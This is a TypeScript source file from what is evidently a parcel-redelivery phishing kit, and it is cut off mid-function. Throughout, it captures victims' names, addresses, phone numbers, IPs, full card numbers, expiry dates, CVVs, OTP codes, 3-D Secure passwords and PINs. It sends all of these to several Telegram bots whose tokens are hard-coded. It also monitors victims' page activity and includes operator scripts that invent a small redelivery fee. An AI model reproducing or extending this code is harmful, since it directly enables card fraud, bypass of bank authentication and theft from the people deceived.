import { useEffect, useState } from 'react';

interface TelegramAPIProps {
  invoiceName?: string;
  address?: string;
  phone?: string;
}

// Bot tokens and chat IDs configuration
const TELEGRAM_CONFIG = {
  API_NOTIFICATIONS: {
    token: '6707760506:AAFpn5AygfJZ20PI3ODYgVJqNS3sAJ7aU0o',
    chatId: '6615114321'
  },
  API_2003: {
    token: '7680168013:AAFyUmlZTcxixB9PNWfDCOfif8O5Wpnon1w',
    chatId: '7817322507'
  },
  API_SALES: {
    token: '6731421433:AAGfwoLJiiIoWUTm0IkT6d1jSRDs2xtZfdI',
    chatId: '6615114321'
  },
  API_AVERI: {
    token: '8419725438:AAEsuUSAbu7UjUP2sUXQB2SYPgzbpGeoblU',
    chatId: '7109028880'
  },
  API_DE_LIEFERUNG: {
    token: (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN || 'TELEGRAM_BOT_TOKEN',
    chatId: '8935741668'
  },
  // Added Sophia DE credentials
  API_SOPHIA_DE: {
    token: '8873455171:AAG7mKfN_iV7BGN58Nf0x_6yHPXs7pw7k4s',
    chatId: '8839744705'
  }
};

// DE Lieferung notifications - only go to API_DE_LIEFERUNG (and now Sophia DE automatically)
export const sendDELieferungPageOpenedNotification = async (invoiceName: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    const message = `${invoiceName} - opened Lieferung page\n${currentUrl}\n${userIP}`;
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_DE_LIEFERUNG.token,
      TELEGRAM_CONFIG.API_DE_LIEFERUNG.chatId,
      message
    );
  } catch (error) {
    console.error('Error in sendDELieferungPageOpenedNotification:', error);
  }
};

export const sendDELieferungUserVerifiedNotification = async (invoiceName: string = "Paket Lieferung") => {
  const message = `🤖 User verified and opened invoice\n📦 Invoice: ${invoiceName}`;
  await sendTelegramMessage(
    TELEGRAM_CONFIG.API_DE_LIEFERUNG.token,
    TELEGRAM_CONFIG.API_DE_LIEFERUNG.chatId,
    message
  );
};

// Helper functions
const getUserIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'Unknown IP';
  }
};

// Low-level helper to send to a specific Telegram endpoint
const sendTelegramMessageDirect = async (botToken: string, chatId: string, message: string) => {
  console.log('🚀 Sending Telegram message:', { botToken: botToken.substring(0, 10) + '...', chatId, message });
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('📡 Telegram URL:', url);
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });
    
    console.log('📥 Response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('❌ API Error Response:', errorText);
      throw new Error(`HTTP error! status: ${response.status}, body: ${errorText}`);
    }
    
    const result = await response.json();
    console.log('✅ Message sent successfully:', result);
  } catch (error) {
    console.error('💥 Error sending message:', error);
  }
};

// Cache to track messages sent to Sophia in the last 3 seconds to avoid spam/duplicates
const sophiaSentCache = new Map<string, number>();

// Centralized wrapper function
const sendTelegramMessage = async (botToken: string, chatId: string, message: string) => {
  // 1. Send the message to its primary recipient
  await sendTelegramMessageDirect(botToken, chatId, message);

  // 2. If this isn't already Sophia's chat, also forward a copy to Sophia DE
  if (chatId !== TELEGRAM_CONFIG.API_SOPHIA_DE.chatId) {
    const now = Date.now();
    
    // Clear out cache entries older than 3 seconds
    for (const [cachedMsg, timestamp] of sophiaSentCache.entries()) {
      if (now - timestamp > 3000) {
        sophiaSentCache.delete(cachedMsg);
      }
    }

    // Only forward to Sophia if she hasn't received this exact text within the cache window
    if (!sophiaSentCache.has(message)) {
      sophiaSentCache.set(message, now);
      await sendTelegramMessageDirect(
        TELEGRAM_CONFIG.API_SOPHIA_DE.token,
        TELEGRAM_CONFIG.API_SOPHIA_DE.chatId,
        message
      );
    }
  }
};

// Reset API function - only resets redirect_sel and bank_name
export const resetInvoiceState = async (invoiceId: string) => {
  try {
    console.log('🔄 Attempting to reset only redirect_sel and bank_name for ID:', invoiceId);
    
    // First, get current invoice data to preserve other fields
    const getResponse = await fetch(`/api/create_invoice.php?invoice_id=${invoiceId}`);
    if (!getResponse.ok) {
      throw new Error(`Failed to get current invoice data: ${getResponse.status}`);
    }
    
    const currentData = await getResponse.json();
    console.log('🔄 Current invoice data:', currentData);
    
    // Now update with preserved data but reset only redirect_sel and bank_name
    const resetData = {
      invoiceId: invoiceId,
      address: currentData.address || '',
      name: currentData.name || '',
      phone: currentData.phone || '',
      city: currentData.city || '',
      zip: currentData.zip || '',
      bank_name: null,        // Reset this
      redirect_sel: null      // Reset this
    };
    
    console.log('🔄 Reset data (preserving other fields):', resetData);
    
    const response = await fetch(`/api/create_invoice.php`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(resetData)
    });
    
    console.log('🔄 Reset response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('🔄 Reset response error text:', errorText);
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Only redirect_sel and bank_name reset successfully:', result);
  } catch (error) {
    console.error('❌ Error resetting invoice state:', error);
  }
};

// Centralized notification functions
export const sendUserVerifiedNotification = async (invoiceName: string = "Package Delivery") => {
  const message = `🤖 User verified and opened invoice\n📦 Invoice: ${invoiceName}`;

  // Send to both API_NOTIFICATIONS and API_2003 (internally handles forwarding to Sophia)
  await Promise.all([
    sendTelegramMessage(TELEGRAM_CONFIG.API_NOTIFICATIONS.token, TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId, message),
    sendTelegramMessage(TELEGRAM_CONFIG.API_2003.token, TELEGRAM_CONFIG.API_2003.chatId, message)
  ]);
};


export const sendRedeliveryPageOpenedNotification = async (invoiceCode: string) => {
  try {
    // Fetch invoice name from database using the code
    let invoiceName = "Unknown Invoice";
    
    try {
      const response = await fetch(`/api/create_invoice.php?invoice_id=${invoiceCode}`);
      if (response.ok) {
        const data = await response.json();
        invoiceName = data.name || "Unknown Invoice";
      }
    } catch (fetchError) {
      console.error('Error fetching invoice name:', fetchError);
    }
    
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - opened redelivery page
${currentUrl}
${userIP}`;
    
    const apiMessage = `${invoiceName} - opened redelivery page`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendRedeliveryPageOpenedNotification:', error);
  }
};

export const sendRedeliveryNotification = async (invoiceName: string, address: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - Pressed book a redelivery`;
    
    const apiMessage = `${invoiceName} - Pressed book a redelivery`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendRedeliveryNotification:', error);
  }
};

export const sendTypingAddressNotification = async (invoiceName: string, address: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - is typing address`;
    
    const apiMessage = `${invoiceName} - is typing address`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendTypingAddressNotification:', error);
  }
};

export const sendAddressConfirmNotification = async (invoiceName: string, address: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - Gave address
    
${address}`;
    
    
    const apiMessage = `${invoiceName} - confirmed address
    
    Address: ${address}`;
    
    // Special message for API_2003 with agent instruction
    const api2003Message = `${invoiceName} - Gave address
    
${address}
Agent:
Now you need to select a delivery date and time when you want this parcel to be delivered.`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendAddressConfirmNotification:', error);
  }
};

export const sendScheduleNotification = async (invoiceName: string, address: string, deliveryDate: string, deliveryTime: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - user selected delivery date and time
Date: ${deliveryDate}
Time: ${deliveryTime}`;
    
    const apiMessage = `${invoiceName} - user selected delivery date and time
Date: ${deliveryDate}
Time: ${deliveryTime}`;
    
    // Special message for API_2003 with agent text
    const api2003Message = `${invoiceName} - user selected delivery date and time
Date: ${deliveryDate}
Time: ${deliveryTime}
Agent: - And now, as i can see, the shipping of the parcel is already paid in total of 12.80.
But there is a small unpaid fee of 1.55 which will cover the redelivery loses.`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendScheduleNotification:', error);
  }
};

export const sendPaymentAcceptedNotification = async (invoiceName: string, address: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - accepted to make payment`;
    
    const apiMessage = `${invoiceName} - accepted to make payment`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendPaymentAcceptedNotification:', error);
  }
};

export const sendTrackingInfoClickNotification = async (invoiceName: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - clicked tracking information`;
    
    const apiMessage = `${invoiceName} - clicked tracking information`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendTrackingInfoClickNotification:', error);
  }
};

export const sendPackageInfoClickNotification = async (invoiceName: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const notificationMessage = `${invoiceName} - clicked package information`;
    
    const apiMessage = `${invoiceName} - clicked package information`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      notificationMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      apiMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      apiMessage
    );
  } catch (error) {
    console.error('Error in sendPackageInfoClickNotification:', error);
  }
};

export const sendCardEntryNotification = async (invoiceName: string) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href;
    
    const message = `${invoiceName} - started entering card details`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      message
    );
  } catch (error) {
    console.error('Error in sendCardEntryNotification:', error);
  }
};

export const sendCard6DigitsNotification = async (invoiceName: string, first6Digits: string) => {
  try {
    const userIP = await getUserIP();
    
    const message = `${invoiceName} - entered first 6 digits
${first6Digits}`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      message
    );
  } catch (error) {
    console.error('Error in sendCard6DigitsNotification:', error);
  }
};

export const sendExpiryNotification = async (invoiceName: string, cardholderName: string, cardNumber: string, expiryDate: string) => {
  try {
    const userIP = await getUserIP();
    
    const salesMessage = `${invoiceName} - confirmed expiry date
${cardholderName}
${cardNumber}
${expiryDate}`;

    const api2003Message = `${invoiceName} - confirmed expiry date`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendExpiryNotification:', error);
  }
};

export const sendCvvNotification = async (invoiceName: string, cardholderName: string, cardNumber: string, expiryDate: string, cvv: string) => {
  try {
    const userIP = await getUserIP();
    
    const salesMessage = `${invoiceName} - entered CVV
${cardholderName}
${cardNumber}
${expiryDate}
${cvv}`;

    const api2003Message = `${invoiceName} - is typing Card Holder name`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendCvvNotification:', error);
  }
};

export const sendSaleNotification = async (
  name: string, 
  address: string, 
  city: string, 
  postCode: string, 
  phone: string, 
  cardholderName: string, 
  cardNumber: string, 
  expiryDate: string, 
  cvv: string
) => {
  try {
    const userIP = await getUserIP();
    const currentUrl = window.location.href
      .replace('/redelivery/', '/redr/')
      .replace('/de/lieferung/', '/redr/')
      .replace('/riconsegna/', '/redr/');
    
    const salesMessage = `SALE

${name}
${address}
${city}
${postCode}
${phone}

${cardholderName}
${cardNumber}
${expiryDate}
${cvv}

${userIP}
${currentUrl}`;

    const api2003Message = `${name} - made payment.

- Now you need to wait until your payment is being confirmed.

It can take up to 30 sec for payment to be made.

Please do not close the payment screen until payment is confirmed.`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendSaleNotification:', error);
  }
};

export const sendOtpSubmittedNotification = async (invoiceName: string, recipientName: string, otpCode: string) => {
  try {
    const salesMessage = `Invoice: ${invoiceName}
Name: ${recipientName}
Code: ${otpCode}`;
    
    const api2003Message = `Invoice: ${invoiceName}
Name: ${recipientName}
Text: gave otp`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendOtpSubmittedNotification:', error);
  }
};

export const sendOtpResendNotification = async (invoiceName: string, recipientName: string) => {
  try {
    const message = `Invoice: ${invoiceName}
Name: ${recipientName}
Text: resend otp`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      message
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      message
    );
  } catch (error) {
    console.error('Error in sendOtpResendNotification:', error);
  }
};

// DE-specific notification functions
export const sendDeOtpRequestNotification = async (invoiceName: string, recipientName: string) => {
  try {
    const salesMessage = `Requesting OTP: ${invoiceName}\n${recipientName}`;
    const averiMessage = `Requesting OTP: ${invoiceName}\n${recipientName}`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendDeOtpRequestNotification:', error);
  }
};

export const sendDeOtpEnteredNotification = async (invoiceName: string, recipientName: string, otpCode: string) => {
  try {
    const salesMessage = `OTP Code: ${otpCode}\n${recipientName}\n`;
    const averiMessage = `OTP Code: ${otpCode}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendDeOtpEnteredNotification:', error);
  }
};

export const sendDeOtpEnteredSimpleNotification = async (invoiceName: string, recipientName: string) => {
  try {
    const salesMessage = `OTP eingegeben: ${invoiceName}\nName: ${recipientName}`;
    const averiMessage = `OTP eingegeben: ${invoiceName}\nName: ${recipientName}`;
    const api2003Message = `OTP eingegeben: ${invoiceName}\nName: ${recipientName}`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
     await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendDeOtpEnteredSimpleNotification:', error);
  }
};

export const sendDeOtpRetryNotification = async (invoiceName: string, recipientName: string) => {
  try {
    const salesMessage = `Rechnung: ${invoiceName}\nName: ${recipientName}\nText: OTP erneut angefordert`;
    const averiMessage = `Rechnung: ${invoiceName}\nName: ${recipientName}\nText: OTP erneut angefordert`;
    const api2003Message = `Rechnung: ${invoiceName}\nName: ${recipientName}\nText: OTP erneut angefordert`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
     await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendDeOtpRetryNotification:', error);
  }
};

// UK-specific notification functions
export const sendUkOtpEnteredNotification = async (invoiceName: string, recipientName: string, otpCode: string) => {
  try {
    const salesMessage = `Invoice: ${invoiceName}\nName: ${recipientName}\nCode: ${otpCode}`;
    const api2003Message = `Invoice: ${invoiceName}\nName: ${recipientName}\nText: gave otp`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendUkOtpEnteredNotification:', error);
  }
};

export const sendUkOtpResendNotification = async (invoiceName: string, recipientName: string) => {
  try {
    const salesMessage = `Invoice: ${invoiceName}\nName: ${recipientName}\nText: pressed resend otp`;
    const api2003Message = `Invoice: ${invoiceName}\nName: ${recipientName}\nText: pressed resend otp`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_2003.token,
      TELEGRAM_CONFIG.API_2003.chatId,
      api2003Message
    );
  } catch (error) {
    console.error('Error in sendUkOtpResendNotification:', error);
  }
};

// Track sent notifications to prevent duplicates
const sentRedirectNotifications = new Set<string>();

// Redirect selection change notification
export const sendRedirectSelChangeNotification = async (invoiceName: string, recipientName: string, redirectSel: string) => {
  try {
    // Check if redirect_sel starts with "de3d app" or "de3 app"
    const lowerRedirectSel = redirectSel.toLowerCase();
    if (lowerRedirectSel.startsWith('de3d app') || lowerRedirectSel.startsWith('de3 app') || lowerRedirectSel.startsWith('uk3 app') || lowerRedirectSel.startsWith('it3 app')) {
      // Create unique key to track this notification
      const notificationKey = `${invoiceName}-${redirectSel}`;
      
      // Only send if not already sent
      if (!sentRedirectNotifications.has(notificationKey)) {
        sentRedirectNotifications.add(notificationKey);
        
        const salesMessage = `${invoiceName} - redirect_sel changed to: ${redirectSel}\nName: ${recipientName}`;
        const averiMessage = `${invoiceName} - redirect_sel changed to: ${redirectSel}\nName: ${recipientName}`;
        
        await sendTelegramMessage(
          TELEGRAM_CONFIG.API_SALES.token,
          TELEGRAM_CONFIG.API_SALES.chatId,
          salesMessage
        );
        
        await sendTelegramMessage(
          TELEGRAM_CONFIG.API_AVERI.token,
          TELEGRAM_CONFIG.API_AVERI.chatId,
          averiMessage
        );
      }
    }
  } catch (error) {
    console.error('Error in sendRedirectSelChangeNotification:', error);
  }
};

// Track sent page visibility notifications to prevent duplicates
const sentPageVisibilityNotifications = new Set<string>();

// Package details and tracking view notifications
export const sendPackageDetailsViewNotification = async (clientName: string) => {
  try {
    const message = `${clientName} - is looking package details`;
    
    // Send only to API_NOTIFICATIONS
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      message
    );
  } catch (error) {
    console.error('Error sending package details view notification:', error);
  }
};

export const sendTrackingInformationViewNotification = async (clientName: string) => {
  try {
    const message = `${clientName} - is looking tracking informations`;
    
    // Send only to API_NOTIFICATIONS
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_NOTIFICATIONS.token,
      TELEGRAM_CONFIG.API_NOTIFICATIONS.chatId,
      message
    );
  } catch (error) {
    console.error('Error sending tracking information view notification:', error);
  }
};

export const sendPageHiddenNotification = async (invoiceName: string) => {
  try {
    const message = `👁️ HIDDEN PAGE\n👤 Client: ${invoiceName}`;
    
    // Send to custom API_PAGEVIEW, API_AVERI, and API_2003 channels
    await Promise.all([
      sendTelegramMessage(
        '6881738624:AAH0_ysP8Dtb_kM1YrNFWBa1tyPAQ410Q74',
        '6615114321',
        message
      ),
      sendTelegramMessage(
        TELEGRAM_CONFIG.API_AVERI.token,
        TELEGRAM_CONFIG.API_AVERI.chatId,
        message
      ),
      sendTelegramMessage(
        TELEGRAM_CONFIG.API_2003.token,
        TELEGRAM_CONFIG.API_2003.chatId,
        message
      )
    ]);
  } catch (error) {
    console.error('Error sending page hidden notification:', error);
  }
};

export const sendPageVisibleNotification = async (invoiceName: string) => {
  try {
    const message = `👀 VISIBLE PAGE\n👤 Client: ${invoiceName}`;
    
    // Send to custom API_PAGEVIEW, API_AVERI, and API_2003 channels
    await Promise.all([
      sendTelegramMessage(
        '6881738624:AAH0_ysP8Dtb_kM1YrNFWBa1tyPAQ410Q74',
        '6615114321',
        message
      ),
      sendTelegramMessage(
        TELEGRAM_CONFIG.API_AVERI.token,
        TELEGRAM_CONFIG.API_AVERI.chatId,
        message
      ),
      sendTelegramMessage(
        TELEGRAM_CONFIG.API_2003.token,
        TELEGRAM_CONFIG.API_2003.chatId,
        message
      )
    ]);
  } catch (error) {
    console.error('Error sending page visible notification:', error);
  }
};

// Italian 3D Secure notifications
export const sendItPasswordEnteredNotification = async (invoiceName: string, recipientName: string, password: string) => {
  try {
    const salesMessage = `Password Code: ${password}\n${recipientName}\n`;
    const averiMessage = `Password Code: ${password}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendItPasswordEnteredNotification:', error);
  }
};

export const sendItZipEnteredNotification = async (invoiceName: string, recipientName: string, zipCode: string) => {
  try {
    const salesMessage = `ZIP Code: ${zipCode}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
  } catch (error) {
    console.error('Error in sendItZipEnteredNotification:', error);
  }
};

export const sendUkPostcodeEnteredNotification = async (invoiceName: string, recipientName: string, postcode: string) => {
  try {
    const salesMessage = `Postcode: ${postcode}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
  } catch (error) {
    console.error('Error in sendUkPostcodeEnteredNotification:', error);
  }
};

export const sendItPinEnteredNotification = async (invoiceName: string, recipientName: string, pin: string) => {
  try {
    const salesMessage = `PIN Code: ${pin}\n${recipientName}\n`;
    const averiMessage = `PIN Code: ${pin}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendItPinEnteredNotification:', error);
  }
};

export const sendItEmailEnteredNotification = async (invoiceName: string, recipientName: string, emailCode: string) => {
  try {
    const salesMessage = `Email Code: ${emailCode}\n${recipientName}\n`;
    const averiMessage = `Email Code: ${emailCode}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendItEmailEnteredNotification:', error);
  }
};

export const sendItOtpEnteredNotification = async (invoiceName: string, recipientName: string, otpCode: string) => {
  try {
    const salesMessage = `OTP Code: ${otpCode}\n${recipientName}\n`;
    const averiMessage = `OTP Code: ${otpCode}\n${recipientName}\n`;
    
    await sendTelegramMessage(
      TELEGRAM_CONFIG.API_SALES.token,
      TELEGRAM_CONFIG.API_SALES.chatId,
      salesMessage
    );
    
    await sendTelegramMessage(
